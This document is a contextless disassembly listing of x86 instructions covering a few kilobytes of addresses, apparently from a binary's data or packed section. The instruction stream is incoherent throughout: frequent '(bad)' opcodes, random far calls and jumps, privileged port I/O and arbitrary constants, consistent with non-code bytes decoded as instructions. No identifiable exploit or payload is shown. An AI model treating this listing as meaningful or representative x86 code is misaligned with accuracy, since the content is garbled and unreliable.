  408831:	dec    eax
  408833:	pop    es
  408834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408835:	call   0x4bed10ef
  40883a:	ror    DWORD PTR [ebp-0x6f],1
  40883d:	lods   al,BYTE PTR ds:[esi]
  40883e:	fs ja  0x408847
  408841:	test   al,0xf7
  408843:	scas   al,BYTE PTR es:[edi]
  408844:	sbb    ecx,DWORD PTR [esi]
  408846:	mov    WORD PTR [edx-0x3d],cs
  408849:	jg     0x408899
  40884b:	popf   
  40884c:	out    0xe4,eax
  40884e:	pop    edx
  40884f:	and    al,0x17
  408851:	jo     0x408870
  408853:	daa    
  408854:	xor    eax,0x36dfece8
  408859:	mov    dl,0xd2
  40885b:	lds    edi,FWORD PTR [ecx+0x24d359d8]
  408861:	cmp    eax,0x8fc4e93
  408866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408867:	rcl    al,cl
  408869:	test   al,ah
  40886b:	fstp   st(0)
  40886d:	les    ebx,FWORD PTR [edi+0x3b41b730]
  408873:	out    dx,eax
  408874:	ja     0x4087fa
  408876:	jmp    DWORD PTR [esi+0x406f8a88]
  40887c:	scas   al,BYTE PTR es:[edi]
  40887d:	and    DWORD PTR [ebx+0x4577e445],ebp
  408883:	lahf   
  408884:	push   ds
  408885:	mov    dh,0x2
  408887:	inc    esi
  408888:	shr    ebx,0x64
  40888b:	leave  
  40888c:	stc    
  40888d:	jp     0x408857
  40888f:	push   0xffffffcf
  408891:	pop    edi
  408892:	test   eax,0x199b6cbd
  408897:	push   esp
  408898:	cmp    BYTE PTR [eax],ch
  40889a:	lds    edi,FWORD PTR [ebx]
  40889c:	add    ebx,ebx
  40889e:	xchg   DWORD PTR [edi],eax
  4088a0:	dec    esi
  4088a1:	sbb    dl,BYTE PTR [di+0x5b]
  4088a5:	jl     0x408849
  4088a7:	push   ds
  4088a8:	add    eax,0xdd6f402a
  4088ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ae:	pop    ebx
  4088af:	push   ecx
  4088b0:	inc    ebp
  4088b1:	add    eax,0x63b95f9f
  4088b6:	mov    eax,eax
  4088b8:	pop    ebp
  4088b9:	loope  0x40890c
  4088bb:	mov    ds:0xd92fa345,al
  4088c0:	dec    ecx
  4088c1:	(bad)  
  4088c2:	out    dx,eax
  4088c3:	and    al,0xf0
  4088c5:	add    ah,BYTE PTR [ecx+ebx*8+0x3bf3c531]
  4088cc:	jp     0x408945
  4088ce:	mov    al,ds:0x57a8e86e
  4088d3:	outs   dx,DWORD PTR cs:[esi]
  4088d5:	dec    ebx
  4088d6:	jl     0x4088c9
  4088d8:	sti    
  4088d9:	sti    
  4088da:	mov    eax,0x5d03b55c
  4088df:	lods   al,BYTE PTR ds:[esi]
  4088e0:	fist   DWORD PTR [ecx-0x72]
  4088e3:	(bad)  
  4088e4:	bound  esi,QWORD PTR [edi]
  4088e6:	iret   
  4088e7:	aam    0xc3
  4088e9:	add    eax,0x523ccf
  4088ee:	add    al,0xe4
  4088f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088f1:	push   es
  4088f2:	mov    edx,0x180b39a0
  4088f7:	and    eax,ecx
  4088f9:	sub    bh,bl
  4088fb:	mov    al,ds:0x76cefa75
  408900:	jp     0x4088fb
  408902:	loope  0x40888d
  408904:	sub    DWORD PTR [ecx-0x52],ebx
  408907:	jl     0x408895
  408909:	into   
  40890a:	mov    eax,edi
  40890c:	out    dx,al
  40890d:	clc    
  40890e:	cs push esi
  408910:	loope  0x4088c9
  408912:	lds    edi,FWORD PTR ds:0xec3df81
  408918:	call   0xae73:0xd9553537
  40891f:	bound  eax,QWORD PTR [edx]
  408921:	call   FWORD PTR [ebp-0x70ad433e]
  408927:	sar    BYTE PTR [ecx],0x7
  40892a:	push   cs
  40892b:	jl     0x408915
  40892d:	jmp    0xaa94:0xf138162c
  408934:	scas   eax,DWORD PTR es:[edi]
  408935:	adc    al,0xe1
  408937:	scas   al,BYTE PTR es:[edi]
  408938:	js     0x408918
  40893a:	sub    DWORD PTR [eax+0x66b3ab45],ebx
  408940:	jnp    0x4089a8
  408942:	inc    edx
  408943:	mov    edx,0x5d102683
  408948:	daa    
  408949:	jl     0x40890a
  40894b:	in     eax,0x61
  40894d:	jmp    0x4088d1
  40894f:	inc    ecx
  408950:	mov    ebx,0x4db944ec
  408955:	jmp    0x31d1:0xc05b1008
  40895c:	jle    0x4089b0
  40895e:	jne    0x408993
  408960:	idiv   dl
  408962:	stc    
  408963:	mov    ah,0xd4
  408965:	ja     0x4089d0
  408967:	daa    
  408968:	(bad)  
  408969:	aad    0x5b
  40896b:	sar    BYTE PTR [ecx-0x31],cl
  40896e:	in     eax,0x60
  408970:	push   ss
  408971:	fs sbb eax,0xaca7c4a7
  408977:	fistp  WORD PTR [ecx-0x7049ac00]
  40897d:	fldenv [eax]
  40897f:	dec    edx
  408980:	push   0x21
  408982:	and    al,0x35
  408984:	xchg   ebp,eax
  408985:	inc    eax
  408986:	sbb    BYTE PTR [eax],al
  408988:	outs   dx,BYTE PTR ds:[esi]
  408989:	mov    ch,0x7c
  40898b:	sahf   
  40898c:	fisubr DWORD PTR [eax]
  40898e:	mov    bh,0x7d
  408990:	push   ebp
  408991:	data16 jbe 0x4089b4
  408994:	inc    ebp
  408995:	in     eax,dx
  408996:	in     al,0x82
  408998:	rol    ah,cl
  40899a:	pop    ebp
  40899b:	dec    esi
  40899c:	clc    
  40899d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40899e:	inc    esp
  40899f:	sahf   
  4089a0:	(bad)  
  4089a1:	mov    cl,0x47
  4089a3:	nop
  4089a4:	xor    al,0x58
  4089a6:	and    DWORD PTR [edx+0x3596e99c],ebp
  4089ac:	jle    0x408970
  4089ae:	cmc    
  4089af:	jbe    0x408a10
  4089b1:	push   esi
  4089b2:	or     ebp,DWORD PTR [ecx+0x48]
  4089b5:	test   BYTE PTR [esi+0x4c],cl
  4089b8:	aad    0x73
  4089ba:	xor    BYTE PTR [esi+0x4c293ac8],bh
  4089c0:	out    dx,al
  4089c1:	fisttp DWORD PTR [esi]
  4089c3:	icebp  
  4089c4:	pop    ss
  4089c5:	bound  ebp,QWORD PTR [ebx+0x14]
  4089c8:	mov    esi,0x7d4014ad
  4089cd:	fcomip st,st(0)
  4089cf:	lods   al,BYTE PTR ds:[esi]
  4089d0:	loop   0x408a31
  4089d2:	fbstp  TBYTE PTR [ecx]
  4089d4:	mov    ecx,0x23e87d9a
  4089d9:	jae    0x4089c7
  4089db:	and    dh,BYTE PTR [ebx+0x46521bbe]
  4089e1:	sbb    edx,DWORD PTR [eax-0xd3ac4d7]
  4089e7:	aas    
  4089e8:	push   edi
  4089e9:	cmp    ah,BYTE PTR [eax]
  4089eb:	and    BYTE PTR [eax+0x20],cl
  4089ee:	sub    al,0x14
  4089f0:	ret    
  4089f1:	out    0xaf,al
  4089f3:	sbb    DWORD PTR [esi-0x77],edx
  4089f6:	test   eax,0x572732ec
  4089fb:	rcl    DWORD PTR [ebx-0x4fc1619],1
  408a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a02:	xor    BYTE PTR [edi+0x5791ea35],bl
  408a08:	stos   DWORD PTR es:[edi],eax
  408a09:	(bad)  
  408a0a:	dec    eax
  408a0b:	pop    esi
  408a0c:	call   0xd8d5:0x58fe996c
  408a13:	loopne 0x408a69
  408a15:	xchg   ecx,eax
  408a16:	dec    ecx
  408a17:	gs pop ss
  408a19:	jo     0x408a6b
  408a1b:	pop    edi
  408a1c:	adc    dh,bl
  408a1e:	mov    eax,0xdaf26c4c
  408a23:	imul   ebp,DWORD PTR [edx+eax*2-0x2455fe1c],0x31
  408a2b:	test   al,0x98
  408a2d:	test   al,0xb2
  408a2f:	add    DWORD PTR [ebp-0x52],esi
  408a32:	xchg   esi,eax
  408a33:	cwde   
  408a34:	xlat   BYTE PTR fs:[ebx]
  408a36:	(bad)  
  408a37:	jl     0x408a2f
  408a39:	adc    al,BYTE PTR [ebx]
  408a3b:	add    BYTE PTR [ecx+0x12],al
  408a3e:	(bad)  
  408a3f:	(bad)  
  408a40:	fisttp QWORD PTR [esi]
  408a43:	out    dx,eax
  408a44:	adc    BYTE PTR [edi+0xb],0xbd
  408a48:	jmp    0x408ab3
  408a4a:	xor    eax,0x74765191
  408a4f:	sub    ah,dh
  408a51:	ins    BYTE PTR es:[edi],dx
  408a52:	dec    ebx
  408a53:	je     0x408acd
  408a55:	aam    0xc7
  408a57:	jnp    0x408a11
  408a59:	in     eax,dx
  408a5a:	cmp    DWORD PTR [eax],ebp
  408a5c:	cmp    al,0x13
  408a5e:	outs   dx,BYTE PTR ds:[esi]
  408a5f:	leave  
  408a60:	out    dx,eax
  408a61:	scas   eax,DWORD PTR es:[edi]
  408a62:	sti    
  408a63:	and    cl,al
  408a65:	jne    0x408ae6
  408a67:	mov    ds:0x6f903fda,al
  408a6c:	jmp    0xc5b1:0x1033bad8
  408a73:	xchg   edi,eax
  408a74:	adc    DWORD PTR [ebp-0x1e],ebx
  408a77:	pop    esi
  408a78:	scas   al,BYTE PTR es:[edi]
  408a79:	inc    edx
  408a7a:	loope  0x408a76
  408a7c:	pop    eax
  408a7d:	inc    eax
  408a7e:	icebp  
  408a7f:	and    edx,ebp
  408a81:	call   0xc4bb:0x72b5e05c
  408a88:	ins    DWORD PTR es:[edi],dx
  408a89:	rcr    DWORD PTR [edx+0xd30e003],0xe0
  408a90:	loope  0x408aa4
  408a92:	fwait
  408a93:	repz (bad) 
  408a95:	fisub  WORD PTR [edx-0x78]
  408a98:	scas   eax,DWORD PTR es:[edi]
  408a99:	ja     0x408b15
  408a9b:	call   0x843850be
  408aa0:	cmp    edi,eax
  408aa2:	test   BYTE PTR [edx+0x3e],ch
  408aa5:	je     0x408a9d
  408aa7:	pop    ecx
  408aa8:	cdq    
  408aa9:	in     eax,0xc4
  408aab:	xchg   ebp,eax
  408aac:	cmp    eax,0x988ced9e
  408ab1:	das    
  408ab2:	les    edx,FWORD PTR [esi+edi*4]
  408ab5:	test   ebx,edx
  408ab7:	enter  0xedbc,0x96
  408abb:	mov    bl,0xe5
  408abd:	jmp    0x35215d03
  408ac2:	xchg   cl,bh
  408ac4:	test   eax,0x78f1340c
  408ac9:	pop    ds
  408aca:	dec    edx
  408acb:	add    eax,0xaf32d230
  408ad0:	sbb    esp,DWORD PTR [ecx]
  408ad2:	in     eax,dx
  408ad3:	ret    0x114a
  408ad6:	mov    ds:0xf243e794,al
  408adb:	adc    BYTE PTR [ecx+0x44],dl
  408ade:	cmp    DWORD PTR [edx+0x3e],edi
  408ae1:	enter  0x8031,0xfa
  408ae5:	je     0x408ac0
  408ae7:	sbb    ebp,DWORD PTR [ecx-0x338a79fd]
  408aed:	gs (bad) 
  408aef:	call   0xbd2:0xd7a55a59
  408af6:	xchg   esi,eax
  408af7:	lods   al,BYTE PTR ds:[esi]
  408af8:	nop
  408af9:	jnp    0x408b5d
  408afb:	out    dx,eax
  408afc:	(bad)  
  408afd:	pop    ebx
  408afe:	and    dh,BYTE PTR ds:0x6c05342d
  408b04:	pushf  
  408b05:	push   eax
  408b06:	mov    dh,0x1b
  408b08:	mov    edi,0x8c361a90
  408b0d:	add    esp,esi
  408b0f:	xor    ch,BYTE PTR [eax]
  408b11:	add    eax,0xd7845ea1
  408b16:	or     dh,BYTE PTR [eax]
  408b18:	jne    0x408b84
  408b1a:	pop    eax
  408b1b:	mov    dh,0xca
  408b1d:	repz scas eax,DWORD PTR es:[edi]
  408b1f:	xor    BYTE PTR [eax-0x36],0xf2
  408b23:	adc    ebx,edi
  408b25:	jno    0x408b76
  408b27:	out    dx,al
  408b28:	dec    eax
  408b29:	mov    edx,0xb81f0fe9
  408b2e:	dec    edi
  408b2f:	inc    ecx
  408b30:	mov    edx,0x3e13420d
  408b35:	lock (bad) 
  408b37:	fimul  WORD PTR [eax-0x5edcbeb2]
  408b3d:	test   al,ch
  408b3f:	mov    WORD PTR [edx],cs
  408b41:	popa   
  408b42:	fiadd  WORD PTR [eax+ebp*8+0x5ca0276e]
  408b49:	sbb    DWORD PTR [esp+edx*4+0x2f4f4ced],edx
  408b50:	(bad)  
  408b51:	scas   eax,DWORD PTR es:[edi]
  408b52:	inc    esi
  408b53:	retf   0x34a7
  408b56:	stos   DWORD PTR es:[edi],eax
  408b57:	mov    ds:0x1b786f2c,eax
  408b5c:	mov    esi,0x540c6fb3
  408b61:	push   0xf0c0cfba
  408b66:	repz in al,dx
  408b68:	push   es
  408b69:	shr    DWORD PTR cs:[ebx+esi*2-0x7a20420a],1
  408b71:	fcmove st,st(6)
  408b73:	leave  
  408b74:	out    dx,al
  408b75:	sub    eax,0xfb76fd9
  408b7a:	push   cs
  408b7b:	sbb    BYTE PTR [edi+0x69],dl
  408b7e:	icebp  
  408b7f:	nop
  408b80:	call   0xddfe72fd
  408b85:	xchg   ecx,eax
  408b86:	out    0xa4,al
  408b88:	push   ss
  408b89:	(bad)  
  408b8b:	retf   
  408b8c:	xchg   ebx,eax
  408b8d:	popf   
  408b8e:	scas   eax,DWORD PTR es:[edi]
  408b8f:	sar    DWORD PTR [edi-0x6d],0x10
  408b93:	popa   
  408b94:	pop    eax
  408b95:	sbb    eax,0xe2c9a48
  408b9a:	pop    ss
  408b9b:	mov    ds:0x938b9602,eax
  408ba0:	xchg   ebx,eax
  408ba2:	xor    al,BYTE PTR [eax+0x48]
  408ba5:	test   eax,0xf84d9d99
  408baa:	fsubrp st(2),st
  408bac:	outs   dx,BYTE PTR ds:[esi]
  408bad:	and    esp,DWORD PTR [esi+ebx*2]
  408bb0:	fisttp DWORD PTR [ebx*1+0x583b023b]
  408bb7:	aam    0xf6
  408bb9:	ds stc 
  408bbb:	jns    0x408b76
  408bbd:	jne    0x408bde
  408bbf:	jo     0x408c1c
  408bc1:	jne    0x408b4f
  408bc3:	pminub mm4,mm2
  408bc6:	push   es
  408bc7:	popa   
  408bc8:	ins    BYTE PTR es:[edi],dx
  408bc9:	ja     0x408b9a
  408bcb:	adc    BYTE PTR [eax+0x753d735f],ch
  408bd1:	push   esp
  408bd2:	adc    esp,edx
  408bd4:	xor    DWORD PTR [esi+0x4826d2bf],edi
  408bda:	mov    esp,0x581876f9
  408bdf:	retf   0x4ba6
  408be2:	das    
  408be3:	cmp    bh,BYTE PTR [ecx-0x59cd4cfe]
  408be9:	dec    esp
  408bea:	sar    DWORD PTR [ecx+0x2a],0xde
  408bee:	inc    esp
  408bef:	add    al,0xe6
  408bf1:	inc    edi
  408bf2:	inc    edx
  408bf3:	gs pop ss
  408bf5:	xor    eax,0xc4af39e1
  408bfa:	add    BYTE PTR [edi-0x1f26fb52],al
  408c00:	daa    
  408c01:	xchg   ebp,eax
  408c02:	daa    
  408c03:	ret    0x6580
  408c06:	sub    DWORD PTR [edx-0x52],esp
  408c09:	jb     0x408c41
  408c0b:	sbb    eax,0x8da6d6d7
  408c11:	pop    es
  408c12:	push   0xffffff8f
  408c14:	mov    ds:0xca6b8768,eax
  408c19:	push   es
  408c1a:	jns    0x408c15
  408c1c:	push   ss
  408c1d:	jp     0x408be9
  408c1f:	cmp    BYTE PTR [esi],al
  408c21:	cmp    edx,ecx
  408c23:	bound  eax,QWORD PTR [esp+ecx*2-0x2ebedb8f]
  408c2a:	fnsave [ecx+edi*1-0x72572047]
  408c31:	pop    edx
  408c32:	mov    ds,WORD PTR [edx-0x61]
  408c35:	jbe    0x408bbf
  408c37:	push   ebx
  408c38:	mov    bl,0x72
  408c3a:	les    ebx,FWORD PTR [ecx-0x7f]
  408c3d:	outs   dx,DWORD PTR ds:[esi]
  408c3e:	mov    WORD PTR [esi+edx*8],fs
  408c41:	jge    0x408ca9
  408c43:	or     eax,DWORD PTR [edx-0x2e5159af]
  408c49:	xor    BYTE PTR [edx+0x68e2f449],cl
  408c4f:	jne    0x408c3a
  408c51:	mov    ecx,0x95fe4444
  408c56:	daa    
  408c57:	sti    
  408c58:	dec    edi
  408c59:	add    DWORD PTR [ebp+esi*1+0x6b],eax
  408c5d:	push   ecx
  408c5e:	outs   dx,DWORD PTR ds:[esi]
  408c5f:	loope  0x408c38
  408c61:	nop
  408c62:	nop
  408c63:	jns    0x408c06
  408c65:	pop    ebp
  408c66:	or     esi,DWORD PTR [edx]
  408c68:	mov    DWORD PTR [esi-0x2fc16a72],edx
  408c6e:	jecxz  0x408c3f
  408c70:	xchg   esi,eax
  408c71:	retf   
  408c72:	jg     0x408cd0
  408c74:	lahf   
  408c75:	add    al,0x89
  408c77:	sub    BYTE PTR [ebp-0x239a981c],al
  408c7d:	mov    bh,0x83
  408c7f:	mov    eax,ds:0x32226465
  408c84:	bound  esi,QWORD PTR [ebx]
  408c86:	ret    
  408c87:	mov    cs,WORD PTR ds:0x32a1235a
  408c8d:	mov    esi,0xac757410
  408c92:	scas   eax,DWORD PTR es:[edi]
  408c93:	xchg   ebp,eax
  408c94:	adc    al,0x56
  408c96:	mov    ?,WORD PTR [ebx]
  408c98:	mov    ds:0x3421a638,eax
  408c9d:	lods   al,BYTE PTR ds:[esi]
  408c9e:	inc    ecx
  408c9f:	maskmovq mm4,(bad)
  408ca0:	mul    DWORD PTR [ebx+eiz*4]
  408ca3:	pop    ebx
  408ca4:	or     BYTE PTR [edx+eax*4],ch
  408ca7:	shr    al,0xc9
  408caa:	ja     0x408c89
  408cac:	ret    
  408cad:	mov    cl,0xef
  408caf:	ja     0x408d30
  408cb1:	hlt    
  408cb2:	stos   DWORD PTR es:[edi],eax
  408cb3:	inc    esp
  408cb4:	push   es
  408cb5:	jmp    FWORD PTR [edx+edx*8]
  408cb8:	push   edi
  408cb9:	mov    esp,DWORD PTR [edi+0x49e7f80e]
  408cbf:	outs   dx,DWORD PTR ds:[esi]
  408cc0:	xor    bh,ah
  408cc2:	mov    DWORD PTR [esp+edi*4],esi
  408cc5:	mov    WORD PTR [edi-0x1e],ss
  408cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cc9:	ins    DWORD PTR es:[edi],dx
  408cca:	imul   esp,DWORD PTR [eax],0xab8557ff
  408cd0:	jae    0x408c8a
  408cd2:	jg     0x408cbc
  408cd4:	pop    DWORD PTR [ebp+0x4d9b4091]
  408cda:	loop   0x408c71
  408cdc:	lahf   
  408cdd:	das    
  408cde:	je     0x408c86
  408ce0:	add    eax,0x5fceb428
  408ce5:	xchg   esp,eax
  408ce6:	call   0x3b1cfd9f
  408ceb:	fnsave [ebx+0x30]
  408cee:	sbb    esi,eax
  408cf0:	aad    0x41
  408cf2:	fcmovne st,st(4)
  408cf5:	ins    DWORD PTR es:[edi],dx
  408cf6:	mov    esi,0x426fd758
  408cfb:	out    0xe8,eax
  408cfd:	and    bh,BYTE PTR [eax]
  408cff:	cld    
  408d00:	and    BYTE PTR [edi+0x2cdb533c],bl
  408d06:	add    ecx,DWORD PTR [ebx+0x168c5e6e]
  408d0c:	into   
  408d0d:	sub    DWORD PTR [edx+ebp*4+0x9],esi
  408d11:	mov    ebp,0xeaa26ad6
  408d16:	mov    eax,ds:0xcfc4eb47
  408d1b:	ins    BYTE PTR es:[edi],dx
  408d1c:	inc    ebp
  408d1d:	sub    BYTE PTR [eax+eiz*4-0x276e80bd],ah
  408d24:	call   0xdd34:0x93880885
  408d2b:	or     BYTE PTR [ebp-0x3fb0db9f],ch
  408d31:	mov    esi,DWORD PTR [ebp-0x54]
  408d34:	leave  
  408d35:	adc    DWORD PTR [ebx-0xd741671],esp
  408d3b:	xchg   ebx,eax
  408d3c:	pop    ds
  408d3d:	xor    DWORD PTR ds:0x6bdee1a0,esp
  408d43:	push   ebx
  408d45:	loopne 0x408d8d
  408d47:	aad    0x61
  408d49:	stc    
  408d4a:	loopne 0x408dac
  408d4c:	sub    edi,DWORD PTR [eax-0x44]
  408d4f:	outs   dx,BYTE PTR ds:[esi]
  408d50:	inc    ecx
  408d51:	mov    ds:0x1989274f,al
  408d56:	pop    esp
  408d57:	adc    DWORD PTR [esi-0x582c41a1],ecx
  408d5d:	jae    0x408d7e
  408d5f:	rcr    DWORD PTR [edi-0x73],cl
  408d62:	cs leave 
  408d64:	cmp    BYTE PTR [ecx-0x53],ch
  408d67:	mov    edi,0xe35ccb06
  408d6c:	cdq    
  408d6d:	pop    ebp
  408d6e:	adc    eax,0x62d85e23
  408d73:	cmp    esp,DWORD PTR [eax]
  408d75:	and    dl,al
  408d77:	pop    eax
  408d78:	(bad)  
  408d79:	or     al,BYTE PTR gs:[edi]
  408d7c:	inc    ecx
  408d7d:	add    BYTE PTR [ebx],ah
  408d7f:	bound  esp,QWORD PTR [ecx]
  408d81:	clc    
  408d82:	jge    0x408dd7
  408d84:	adc    ebp,DWORD PTR [ebx]
  408d86:	sub    esi,edx
  408d88:	and    eax,0xa2fc210
  408d8d:	xlat   BYTE PTR ds:[ebx]
  408d8e:	fs xchg ebx,eax
  408d90:	sub    DWORD PTR [ecx+0x20c10e8b],esp
  408d96:	xchg   esi,eax
  408d97:	into   
  408d98:	ds pop esp
  408d9a:	mov    bh,0x9c
  408d9c:	popf   
  408d9d:	mov    bl,0x63
  408d9f:	dec    ebp
  408da0:	pushf  
  408da1:	neg    BYTE PTR [esi+esi*8]
  408da4:	dec    edx
  408da5:	jle    0x408e19
  408da7:	inc    DWORD PTR ss:[esi-0x73]
  408dab:	ins    BYTE PTR es:[edi],dx
  408dac:	mov    ecx,0x2a1ef3e
  408db1:	ss push ebx
  408db3:	pushf  
  408db4:	ins    DWORD PTR es:[edi],dx
  408db5:	cmp    bh,BYTE PTR [eax-0x39]
  408db8:	je     0x408e0a
  408dba:	dec    ebx
  408dbb:	jmp    DWORD PTR [esi]
  408dbd:	mov    bh,0x7b
  408dbf:	mov    esp,0xbcdf2099
  408dc4:	sbb    ebx,esp
  408dc6:	inc    esp
  408dc7:	dec    ebx
  408dc8:	push   esp
  408dc9:	div    BYTE PTR [edi]
  408dcb:	std    
  408dcc:	and    ebx,DWORD PTR [esi]
  408dce:	popf   
  408dcf:	lock pop ebx
  408dd1:	lods   eax,DWORD PTR ds:[esi]
  408dd2:	into   
  408dd3:	cmp    eax,0x52103235
  408dd8:	add    dh,al
  408dda:	push   cs
  408ddb:	sti    
  408ddc:	lds    edi,FWORD PTR [eax+0x4b]
  408ddf:	mov    edi,0xbdc84574
  408de4:	sub    ebx,DWORD PTR [esi]
  408de6:	push   ebx
  408de7:	xchg   esp,eax
  408de8:	sbb    BYTE PTR [edi*8+0x8725b42],cl
  408def:	cmp    al,0x1c
  408df1:	xor    ecx,eax
  408df3:	lea    ebx,[edi-0x47]
  408df6:	push   0x96c348f8
  408dfb:	nop
  408dfc:	clc    
  408dfd:	les    edi,FWORD PTR [edi]
  408dff:	inc    edx
  408e00:	add    BYTE PTR [ebx+0x4df9c84f],ah
  408e06:	cmp    BYTE PTR [eax],ch
  408e08:	adc    esp,DWORD PTR [edi+0x71]
  408e0b:	xchg   ecx,eax
  408e0c:	(bad)  
  408e0d:	loopne 0x408e4c
  408e0f:	imul   ebx,DWORD PTR [ebp+eiz*2+0x67],0x19a69c3e
  408e17:	bsr    edx,DWORD PTR [edi]
  408e1a:	dec    ebp
  408e1b:	sbb    eax,0x23ad6cce
  408e20:	pop    ebx
  408e21:	and    al,0x5c
  408e23:	sbb    al,0x26
  408e25:	aad    0x71
  408e27:	stc    
  408e28:	mov    esp,0x3cf2ebbc
  408e2d:	or     al,ah
  408e2f:	and    ch,BYTE PTR [edx+ebx*1+0x7741d090]
  408e36:	pop    bp
  408e38:	xor    BYTE PTR [ecx+ecx*4],dh
  408e3b:	pop    ebp
  408e3c:	fdiv   DWORD PTR ds:0xd5b2e02b
  408e42:	and    dh,BYTE PTR [eax-0x3496b206]
  408e48:	dec    eax
  408e49:	dec    esi
  408e4a:	jno    0x408e24
  408e4c:	lea    ebx,[eax+ecx*2+0x3f1fd885]
  408e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e54:	xchg   esi,eax
  408e55:	mov    edi,esi
  408e57:	not    DWORD PTR [edi]
  408e59:	(bad)  
  408e5a:	leave  
  408e5b:	in     eax,0x6e
  408e5d:	sub    eax,0x14d162a5
  408e62:	inc    eax
  408e63:	(bad)  
  408e64:	jmp    FWORD PTR [esi+0x13]
  408e67:	adc    ecx,DWORD PTR [edx-0x5fd9614e]
  408e6d:	loop   0x408eed
  408e6f:	scas   eax,DWORD PTR es:[edi]
  408e70:	sub    eax,0xf895ccb6
  408e75:	cmp    al,0xe0
  408e77:	xchg   edi,eax
  408e78:	pusha  
  408e79:	sbb    eax,DWORD PTR [eax+0x64]
  408e7c:	(bad)  
  408e7d:	push   cs
  408e7e:	sub    edx,DWORD PTR [ecx*4+0x18ea92e5]
  408e85:	loope  0x408e73
  408e87:	fnstcw WORD PTR [ebx-0x39]
  408e8a:	lods   eax,DWORD PTR ds:[esi]
  408e8b:	bound  edi,QWORD PTR [ebp-0x46]
  408e8e:	pop    ebp
  408e90:	pop    eax
  408e91:	push   0xffffffb4
  408e93:	sbb    al,0x5c
  408e95:	lock sub al,0x78
  408e98:	aad    0x65
  408e9a:	or     eax,0x1ad176cc
  408e9f:	stos   BYTE PTR es:[edi],al
  408ea0:	sbb    al,cl
  408ea2:	jns    0x408e4b
  408ea4:	repnz in eax,dx
  408ea6:	repnz cwde 
  408ea8:	inc    eax
  408ea9:	sub    BYTE PTR [ebx+ebp*1],ah
  408eac:	or     DWORD PTR [esi+ebx*8-0x7d],0x61
  408eb1:	jae    0x408ef3
  408eb3:	out    dx,eax
  408eb4:	nop
  408eb5:	push   es
  408eb6:	xchg   ebx,eax
  408eb7:	cli    
  408eb8:	pop    ebx
  408eb9:	nop
  408eba:	div    BYTE PTR [ebx+0x1]
  408ebd:	xor    eax,0x27150314
  408ec2:	mov    edi,0xef3e0483
  408ec7:	and    cl,cl
  408ec9:	add    eax,0xbdd9db2f
  408ece:	add    al,0x3a
  408ed0:	lahf   
  408ed1:	(bad)  
  408ed3:	or     al,0xdc
  408ed5:	jnp    0x408e91
  408ed7:	retf   
  408ed8:	gs pop ecx
  408eda:	dec    edx
  408edb:	push   0x7890612c
  408ee0:	daa    
  408ee1:	leave  
  408ee2:	adc    DWORD PTR [ebx-0x1e],ecx
  408ee5:	inc    ebx
  408ee6:	mov    dl,0x32
  408ee8:	(bad)  
  408ee9:	mov    dl,0xb7
  408eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eec:	mov    ebx,0x5d63573b
  408ef1:	sub    al,0xd0
  408ef3:	jnp    0x408eda
  408ef5:	scas   eax,DWORD PTR es:[edi]
  408ef6:	jle    0x408f5b
  408ef8:	dec    ebp
  408ef9:	mov    eax,0x77552c6a
  408efe:	sbb    BYTE PTR [eax-0x3d7eab30],ah
  408f04:	inc    eax
  408f05:	or     DWORD PTR [ecx-0x37ed65a2],0x13280734
  408f0f:	cmp    BYTE PTR [esp+esi*1-0x2bcbd96],dh
  408f16:	jo     0x408ee2
  408f18:	es jae 0x408f70
  408f1b:	pop    esp
  408f1c:	adc    cl,al
  408f1e:	addr16 xor dh,al
  408f21:	pop    ebx
  408f22:	stc    
  408f23:	das    
  408f24:	mov    BYTE PTR [ebp+0x6b3b5297],cl
  408f2a:	dec    ebx
  408f2b:	push   ecx
  408f2c:	sub    eax,DWORD PTR [ebx-0x474408d]
  408f32:	jno    0x408f67
  408f34:	push   0x46
  408f36:	xchg   BYTE PTR [esp+ebx*2],dl
  408f39:	stc    
  408f3a:	push   eax
  408f3b:	adc    BYTE PTR [eax-0x70c3c965],cl
  408f41:	mov    ds:0x7971eaf4,eax
  408f46:	mov    ch,BYTE PTR [eax-0xb464e6f]
  408f4c:	clc    
  408f4d:	popa   
  408f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f4f:	inc    eax
  408f50:	mov    bl,0x4d
  408f52:	dec    esp
  408f53:	adc    BYTE PTR [ebp+0x7a],0x8b
  408f57:	xchg   edi,eax
  408f58:	or     ecx,DWORD PTR [ecx+0x16]
  408f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f5c:	push   ecx
  408f5d:	loope  0x408f95
  408f5f:	jbe    0x408f56
  408f61:	inc    ebp
  408f62:	fist   WORD PTR [ebx+ecx*2+0x76]
  408f66:	addr16 gs pop edi
  408f69:	fcomp  QWORD PTR [eax]
  408f6b:	cmp    eax,0xf8780b72
  408f70:	or     BYTE PTR [ecx-0x23],ch
  408f73:	imul   ecx,ecx,0x88b46bfe
  408f79:	inc    esi
  408f7a:	aaa    
  408f7b:	push   cs
  408f7c:	out    0x10,al
  408f7e:	pop    ecx
  408f7f:	and    edx,DWORD PTR [eax]
  408f81:	out    dx,eax
  408f82:	mov    eax,ds:0x80455991
  408f87:	jp     0x408f60
  408f89:	addr16 pop ebx
  408f8b:	inc    edx
  408f8c:	gs aas 
  408f8e:	neg    DWORD PTR [edi-0x30]
  408f91:	in     eax,0xb3
  408f93:	lea    eax,[ebp-0x64]
  408f96:	cwde   
  408f97:	jl     0x408f1a
  408f99:	jb     0x408fa9
  408f9b:	mov    bl,0xd5
  408f9d:	test   eax,0x9ea52493
  408fa2:	mov    edi,0xc0f579bb
  408fa7:	fcmovbe st,st(4)
  408fa9:	cmc    
  408faa:	mov    dl,0x4b
  408fac:	push   cs
  408fad:	aaa    
  408fae:	push   ecx
  408faf:	push   edx
  408fb0:	jmp    0x7096df24
  408fb5:	pop    ebx
  408fb6:	xchg   edx,eax
  408fb7:	pop    ebp
  408fb8:	xchg   ecx,eax
  408fb9:	pop    esi
  408fba:	repnz fwait
  408fbc:	and    al,bl
  408fbe:	fnstenv [edi+0x52]
